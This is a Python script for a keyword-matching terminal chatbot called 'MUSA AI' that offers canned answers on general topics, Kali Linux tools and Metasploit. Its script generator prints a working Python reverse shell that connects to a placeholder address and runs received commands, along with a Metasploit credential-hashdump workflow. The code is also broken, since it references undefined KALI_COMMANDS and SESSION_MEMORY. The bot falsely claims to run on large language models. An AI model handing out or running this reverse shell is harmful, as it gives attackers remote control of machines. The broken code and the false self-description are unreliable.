#!/usr/bin/env python3
"""
MUSA AI - Professional Advanced Assistant (v3.0)
Like a powerful personal AI (Meta AI / Claude style)

Features:
- Professional, long, detailed answers
- Handles ANY question (general knowledge, tech, science, life, etc.)
- Deep Kali Linux + Python expertise
- Dynamic code/script generator
- Advanced natural conversation
- Structured, high-quality responses

Run: python3 MUSA_AI_PRO.py
"""

import sys
import time
import os
from datetime import datetime
import random

# ====================== CONFIG ======================
AI_NAME = "MUSA AI"
USER_NAME = "Boss"
VERSION = "3.0 - Professional Edition"
PERSONALITY = "professional, knowledgeable, helpful"

# ====================== COLORS ======================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'

def cprint(text, color=Colors.OKCYAN, bold=False, end="\n"):
    prefix = Colors.BOLD if bold else ""
    print(f"{prefix}{color}{text}{Colors.ENDC}", end=end)

def speak(text, slow=False):
    """Professional speaking style"""
    print(f"\n{Colors.OKGREEN}🤖 {AI_NAME}:{Colors.ENDC} ", end="", flush=True)
    for char in text:
        print(char, end="", flush=True)
        time.sleep(0.008 if not slow else 0.018)
    print()

def print_section(title):
    cprint(f"\n{'─' * 60}", Colors.GRAY)
    cprint(f"  {title}", Colors.OKCYAN, bold=True)
    cprint("─" * 60, Colors.GRAY)

# ====================== PROFESSIONAL KNOWLEDGE BASE ======================

# General Knowledge (Large & Detailed)
GENERAL_KNOWLEDGE = {
    "who are you": f"""I am {AI_NAME} v{VERSION}, your professional personal AI assistant.

I was built to be highly capable like advanced AI systems (Meta AI, Claude, Grok). 
I specialize in:
• Kali Linux & Ethical Hacking
• Python Programming & Automation
• Technical problem solving
• General knowledge & learning

I give detailed, structured, and accurate answers. I can help you with almost anything — from coding and cybersecurity to science, technology, and life advice.""",

    "what is ai": """Artificial Intelligence (AI) is the simulation of human intelligence in machines.

Modern AI systems (like me) use large language models trained on massive amounts of data. They can:
- Understand and generate natural language
- Answer questions
- Write code
- Analyze problems
- Reason step by step

There are different types:
1. Narrow AI (what most systems are today) — very good at specific tasks
2. General AI (AGI) — human-level intelligence across all domains (still developing)
3. Super AI — theoretical future AI that surpasses humans

I am a sophisticated Narrow AI designed specifically to be your powerful assistant.""",

    "how does the internet work": """The Internet works through a global network of computers communicating using standardized protocols.

Key concepts:
• **IP Addresses**: Every device has a unique address (like 192.168.1.1)
• **DNS**: Translates domain names (google.com) into IP addresses
• **HTTP/HTTPS**: Protocol for websites
• **TCP/IP**: Core protocols that ensure data is delivered correctly
• **Routers & Switches**: Direct traffic across networks

When you type google.com:
1. Your computer asks DNS for the IP
2. It sends a request through routers
3. Google's servers respond
4. Data comes back in packets

The whole process usually takes less than 100 milliseconds.""",

    "what is python": """Python is one of the most powerful and popular programming languages in the world.

Why Python is great:
• Extremely readable and simple syntax
• Used in almost every field (AI, web, automation, data science, hacking, etc.)
• Huge ecosystem of libraries
• Excellent for beginners and professionals

Popular uses:
- Web development (Django, Flask)
- Data Science & AI (Pandas, TensorFlow, PyTorch)
- Automation & Scripting
- Cybersecurity & Ethical Hacking
- Game development

Python is currently one of the top 3 most used languages globally.""",

    "what is kali linux": """Kali Linux is the world's most popular penetration testing and ethical hacking operating system.

It is based on Debian and comes pre-installed with over 600 security tools.

Key areas:
• Information Gathering (theHarvester, Nmap, Amass)
• Vulnerability Analysis (Nikto, Nessus)
• Web Application Testing (Burp Suite, SQLmap)
• Password Attacks (Hydra, John, Hashcat)
• Wireless Attacks (Aircrack-ng, Wifite)
• Exploitation (Metasploit)
• Post Exploitation (LinPEAS, BloodHound)

Kali is used by penetration testers, red teamers, security researchers, and law enforcement worldwide.""",

    "what is metasploit": """Metasploit is the most powerful and widely used exploitation framework in the world.

It allows security professionals to:
- Find vulnerabilities
- Develop and test exploits
- Launch attacks in a controlled manner
- Perform post-exploitation activities

Main components:
• msfconsole - The main interface
• msfvenom - Payload generator
• Auxiliary modules
• Exploit modules
• Post modules

It is used both offensively (by attackers) and defensively (by security teams to test systems).""",

    "what is machine learning": """Machine Learning (ML) is a subset of AI where systems learn from data without being explicitly programmed.

Types:
1. **Supervised Learning** - Learning from labeled data (e.g., spam detection)
2. **Unsupervised Learning** - Finding patterns in unlabeled data (e.g., customer segmentation)
3. **Reinforcement Learning** - Learning through trial and error (e.g., game playing)

Popular algorithms:
- Linear Regression
- Decision Trees
- Neural Networks
- Random Forest
- Support Vector Machines

Modern AI (ChatGPT, image generators, etc.) heavily relies on deep learning, which is a type of machine learning.""",
}

# Kali Linux Detailed Knowledge
KALI_DETAILED = {
    "nmap": """**Nmap** is the most important reconnaissance tool in cybersecurity.

Basic usage:
nmap 192.168.1.1

Most useful scans:
• nmap -sV -sC target          → Service + script scan (most common)
• nmap -p- target              → Scan all 65535 ports
• nmap -A target               → Aggressive scan (OS, version, scripts)
• nmap --script vuln target    → Vulnerability scanning
• nmap -sU target              → UDP scan

Pro tips:
- Always start with -sV -sC
- Use -T4 for faster scans on internal networks
- Save output with -oN filename.txt""",

    "metasploit": """**Metasploit Framework** is an exploitation platform.

Basic workflow:
1. msfconsole
2. search [keyword]
3. use exploit/path
4. show options
5. set RHOSTS target
6. set LHOST your_ip
7. exploit

Most used modules:
- exploit/multi/handler (for catching shells)
- windows/meterpreter/reverse_tcp
- linux/x64/meterpreter/reverse_tcp

After getting a shell:
sessions -i 1
sysinfo
getuid
hashdump""",

    "gobuster": """**Gobuster** is used for directory and subdomain brute forcing.

Directory brute forcing:
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

Subdomain brute forcing:
gobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt

Useful flags:
- -x php,html,txt     → Search for specific extensions
- -t 50               → Number of threads
- -o output.txt       → Save results""",
}

# Python Automation Knowledge
PYTHON_PRO = {
    "automation": """Python is the best language for automation.

Popular automation libraries:
• subprocess - Run system commands
• requests - Web requests
• beautifulsoup4 - Web scraping
• paramiko - SSH automation
• scapy - Packet manipulation
• schedule - Task scheduling

Example automation areas:
- System administration
- Web scraping
- File organization
- Penetration testing workflows
- Report generation""",

    "best_practices": """Professional Python practices:
• Use virtual environments (venv)
• Follow PEP 8 style guide
• Write docstrings
• Use meaningful variable names
• Handle exceptions properly
• Write modular code
• Use type hints (Python 3.5+)""",
}

def get_detailed_response(question):
    q = question.lower().strip()

    # Direct knowledge matches
    for key, value in GENERAL_KNOWLEDGE.items():
        if key in q:
            return value

    for key, value in KALI_DETAILED.items():
        if key in q:
            return value

    # Smart general responses
    if "how are you" in q:
        return "I'm running perfectly and ready to help you at a high level. How can I assist you today?"

    if "what is" in q and "linux" in q:
        return "Linux is an open-source operating system kernel. Distributions like Kali, Ubuntu, and Debian are built on top of it. It powers most servers, Android phones, and supercomputers."

    if "how to" in q and "learn" in q and "hacking" in q:
        return """To become a professional ethical hacker:

1. Learn Linux fundamentals (especially command line)
2. Master networking (TCP/IP, OSI model)
3. Learn Python + Bash scripting
4. Study web technologies (HTTP, JavaScript, SQL)
5. Practice on TryHackMe, HackTheBox, and PortSwigger Academy
6. Get certified (OSCP, eJPT, PNPT)
7. Build your own lab

Start with the basics — don't rush into tools."""

    if "best" in q and "tool" in q:
        return "It depends on the task. For reconnaissance: Nmap + Amass. For web: Burp Suite. For exploitation: Metasploit. For password cracking: Hashcat. The best tool is the one you understand deeply."

    # Default professional response
    return f"""I understand you're asking about "{question}".

This is a broad topic. To give you the most accurate and detailed answer, could you please be more specific?

For example:
- Are you asking about the technical details?
- Do you want practical examples or commands?
- Are you looking for learning resources?
- Do you want a comparison with similar technologies?

I'm happy to provide a comprehensive, professional-level explanation once I understand exactly what you need."""

# ====================== ADVANCED SCRIPT GENERATOR ======================
def generate_advanced_script(task):
    task = task.lower()

    if "port scan" in task or "scanner" in task:
        return '''#!/usr/bin/env python3
"""Professional Port Scanner by MUSA AI"""
import socket
import sys

def scan_port(target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is OPEN")
    except:
        pass

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else input("Target IP: ")
    ports = range(1, 1025)
    print(f"[*] Scanning {target}...")
    for port in ports:
        scan_port(target, port)
    print("[+] Scan complete")'''

    elif "recon" in task:
        return '''#!/usr/bin/env python3
"""Advanced Recon Automation - MUSA AI"""
import subprocess, sys, os

def run_command(cmd):
    print(f"[*] Running: {' '.join(cmd)}")
    subprocess.run(cmd)

target = sys.argv[1]
os.makedirs(target, exist_ok=True)

run_command(["nmap", "-sC", "-sV", "-p-", "-oN", f"{target}/nmap.txt", target])
run_command(["gobuster", "dir", "-u", f"http://{target}", "-w", "/usr/share/wordlists/dirb/common.txt", "-o", f"{target}/dirs.txt"])

print(f"[+] Full recon completed. Results saved in {target}/")'''

    elif "reverse shell" in task:
        return '''# Professional Python Reverse Shell - MUSA AI
import socket, subprocess, os

HOST = "YOUR_IP"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode().strip()
    if command.lower() in ["exit", "quit"]:
        break
    output = subprocess.getoutput(command)
    s.send(output.encode() + b"\\n")'''

    else:
        return f'''#!/usr/bin/env python3
"""Custom script generated by MUSA AI for: {task}"""
print("[+] Professional script ready for: {task}")
# TODO: Add your logic here
# Example: Add your code below
'''

# ====================== MAIN PROCESSING ======================
def process_input(user_input):
    text = user_input.strip().lower()

    # Exit
    if text in ["exit", "quit", "bye", "goodbye"]:
        speak("Thank you for using MUSA AI. Stay curious and keep learning. Goodbye!")
        return False

    # Help
    if text == "help":
        print_section("PROFESSIONAL MUSA AI COMMANDS")
        print("""
  General:
    • Ask any question (I give detailed answers)
    • "what is machine learning"
    • "how does the internet work"
    • "explain metasploit"

  Kali Linux:
    • show kali
    • nmap help
    • metasploit help
    • kali recon

  Python & Automation:
    • python automation
    • generate python script for port scanner
    • generate python script for recon

  Utilities:
    • search [keyword]
    • memory
    • clear
        """)
        return True

    # Kali Commands
    if text in ["kali", "show kali"]:
        print_section("ADVANCED KALI LINUX COMMANDS")
        current = ""
        for cmd, info in sorted(KALI_COMMANDS.items()):
            if info.get("category") != current:
                current = info.get("category", "")
                cprint(f"\n🔹 [{current}]", Colors.OKCYAN, bold=True)
            print(f"  {cmd:<14} → {info['desc']}")
            print(f"     Example: {info['example']}")
        return True

    if text.startswith("kali "):
        cat = text.replace("kali ", "").strip()
        print_section(f"KALI - {cat.upper()}")
        for cmd, info in KALI_COMMANDS.items():
            if info.get("category", "").lower() == cat:
                print(f"• {cmd}: {info['desc']}")
        return True

    # Specific tool help
    if text.endswith(" help"):
        tool = text.replace(" help", "").strip()
        if tool in KALI_DETAILED:
            print_section(f"DETAILED: {tool.upper()}")
            print(KALI_DETAILED[tool])
            return True

    # Generate script
    if "generate python script" in text or "create script" in text:
        task = text.replace("generate python script for", "").replace("create script for", "").strip()
        if not task:
            task = input(f"{Colors.OKCYAN}What should the script do? {Colors.ENDC}").strip()
        script = generate_advanced_script(task)
        cprint(f"\n✅ PROFESSIONAL PYTHON SCRIPT GENERATED", Colors.OKGREEN, bold=True)
        print("-" * 55)
        print(script)
        print("-" * 55)
        return True

    # Python automation
    if "python" in text and ("automation" in text or "script" in text):
        print_section("PYTHON AUTOMATION")
        print(PYTHON_PRO["automation"])
        return True

    # Fuzzy search
    if text.startswith("search "):
        query = text.replace("search ", "").strip()
        matches = [cmd for cmd in KALI_COMMANDS if query in cmd]
        if matches:
            cprint(f"\n🔍 Search results for '{query}':", Colors.OKCYAN)
            for m in matches:
                print(f"  • {m} → {KALI_COMMANDS[m]['desc']}")
        return True

    # Memory
    if text == "memory":
        print_section("SESSION MEMORY")
        for i, cmd in enumerate(SESSION_MEMORY[-6:], 1):
            print(f"  {i}. {cmd}")
        return True

    # Clear
    if "clear" in text:
        os.system("clear" if os.name != "nt" else "cls")
        print_header()
        return True

    # General intelligent response
    response = get_detailed_response(user_input)
    speak(response)
    return True

def print_header():
    print("\n" + "=" * 70)
    cprint(f"    {AI_NAME.upper()}  •  PROFESSIONAL AI ASSISTANT v{VERSION}", Colors.OKCYAN, bold=True)
    print(f"    {Colors.GRAY}Advanced • Detailed • Professional{Colors.ENDC}")
    print("=" * 70)

def main():
    print_header()
    speak(f"Hello {USER_NAME}. I am {AI_NAME} — a professional-grade AI assistant.")
    speak("I can answer almost any question in detail, help with Kali Linux, generate Python scripts, and more.")
    speak("Ask me anything. Type 'help' to see powerful commands.")

    while True:
        try:
            user_input = input(f"\n{Colors.OKBLUE}👤 {USER_NAME}:{Colors.ENDC} ").strip()
            if not user_input:
                continue
            if not process_input(user_input):
                break
        except KeyboardInterrupt:
            print("\n")
            speak("Session ended professionally. Take care!")
            break
        except Exception as e:
            speak("I encountered an issue. Please try again.")

if __name__ == "__main__":
    main()